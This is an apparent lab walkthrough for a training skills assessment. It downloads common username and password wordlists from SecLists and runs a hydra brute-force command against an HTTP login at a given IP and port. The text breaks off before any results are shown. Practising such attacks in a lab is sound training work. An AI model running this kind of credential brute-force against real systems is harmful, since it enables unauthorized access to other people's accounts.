The first part of the skills assessment will require you to brute-force the the target instance. Successfully finding the correct login will provide you with the username you will need to start Skills Assessment Part 2.

You might find the following wordlists helpful in this engagement: [usernames.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt) and [passwords.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt)

Let's begin by downloading both wordlists to our machine:

```
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/top-usernames-shortlist.txt 
```

```
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
```

Once we've got everything, let's begin with the bruteforce process, we can use hydra for this process:

```
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 94.237.54.164 -s 42572 http-get -t 60
```

We get the following:

```
